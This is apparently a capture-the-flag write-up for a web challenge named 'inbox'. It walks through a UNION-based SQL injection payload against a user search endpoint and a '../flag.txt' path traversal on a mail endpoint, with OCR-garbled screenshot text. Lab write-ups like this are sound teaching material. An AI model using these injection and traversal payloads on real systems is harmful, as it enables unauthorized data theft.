# inbox
> I heard this email server has two halves of a whole flag in it!

## About the Challenge
We were given a website without the source code and there are some functionality such as:
* Search users
* Read an email


[Image extracted text: Search for users
email
Submit
Our most popular users
alice@fakeinbox com
bob@fakeinbox.com
charlie@fakeinbox com]


## How to Solve?
If there's a search feature in this website, the first vulnerability that comes to my mind is SQL injection. First, I tried UNION-based SQL injection:


[Image extracted text: https:IIthecybercoopctf-inbox chals iolusers/search?query-%27+union%2Oselect%201,2--%20-
Results
1 - 2
1
alice@fakeinbox com
2
bob@fakeinbox com]


As we can see here, the website is vulnerable to SQL injection. In order to obtain the flag, we need to read a `flags` table using this payload."

```
' UNION SELECT (SELECT flag from flags),2-- -
```


[Image extracted text: https:IIthecybercoopctf-inbox chals io/users/search?query-%27+union%2Oselect%20(select%2Oflag%2Ofrom%2Oflags) ,2--%20-
Results
1
alice@fakeinbox com
2
bob@fakeinbox com
3
charlie@fakeinbox com
flag{off_to_a_good_start _
2]


We got the first path! And now we need to get the second part.There's a path traversal vulnerability in `/mail/` endpoint. When I tried a random string (Ex: `/main/test`). The output:


[Image extracted text: Request
Response
Pretty
Raw
Hex
3)
In
=
Pretty
Raw
Hex
Render
GET
Imail/test HTTP/1.1
Host:
thecybercoopctf-inbox. chals
io
Error:
ENOENT:
no
such
file
or
directory,
scandir
{mail/test
User-Agent
Mozilla/5 .0
(Windows
NT
10.0;
Win64;
X64)
AppleWebKit/537.36
(KHTML ,
at
readdirSync (fs.js:1043:3)
like
Gecko)
Chrome_
120.0.6099
71
Safari/537.36
at
/usrfsrc/app/ index.js:61:3
Accept:
at
Layer-handle
[as
hand
request]
(Zusrisrc/app/node_modules/expressfl:
text/html,application/xhtml+xml,application/xml;q=0.9, image/avif _
image/webp, image/a
at
next
(/usr/src/app/node
modulesfexpress/libfrouter/route.js: 144:13)
png
*/*;q=0.8,application/signed-exchange;v=b3;q-=0.7
at
Route-dispatch
(Tusrfsrc/applnode_
modules/express/lib/ router/route.js:
5
Sec-Fetch-Site
none
at
Layer-handle
[as
hand
request]
(/usr/src/app/node_
modules/expressfl:
6
Sec-Fetch-Mode
navigate
at /usr/src/app/node_
modulesfexpress/libfrouterfindex. js: 284:15
Sec-Fetch-User:
21
at
param
(/usr/src/app/node_modules/express/ lib/router/index.js:365:14)
Sec-Fetch-Dest:
document
9
Accept-Encoding
gzip,
deflate
br
at
param
(Tusr/src/app/node_
modules/express/ libfrouterfindex-js
376:14)
10 Accept-Language
en-US, en;q-0.9
at
Function.process_params
(/usr/src/appnode_modules/express/Lib/router,
11
Priority:
u=0
12
Connection:
close
le_
le_]


To obtain the second part of the flag, we can use the `../flag.txt`


[Image extracted text: Request
Response
Pretty
Raw
Hex
3)
In
=
Pretty
Raw
Hex
Render
GET
Imail/
Iflag
txt HTTP/1.1
HTTP/1.1
200
OK
Host:
thecybercoopctf_inbox. chals. iol
2
X-Powered-By=
Express
User-Agent:
Mozilla/5.0
(Windows
NT
10.0;
Win64;
X64)
AppleWebKit/537
36
(KHTML ,
3 Content-Type
text/plain;
charset-utf-8
like
Gecko)
Chrome/120 _
0.6099.71
Safari/537.36
Content-Length:
26
Accept:
5
W/" 1a-mZaaGNncQH4RSioCGM3epCwhyuc"
text/html,application/xhtml+xml,application/xml;
9 , image/avif , image/webp, image/a
6
Date:
Tue
19
Dec
2023
02:09:50
GMT
png,*/*;9-0.8,application/signed-exchange;v=b3;q=0.7
Connection:
close
5
Sec-Fetch-Site:
none
Sec-Fetch-Mode:
navigate
even_better_finish_though}
Sec-Fetch-User:
21
Sec-Fetch-Dest:
document
Accept-Encoding
gzip,
deflate,
br
10
Accept-Lanquaae
en-US
en; a=0
ETag:
q=0.]


```
flag{off_to_a_good_start_even_better_finish_though}
```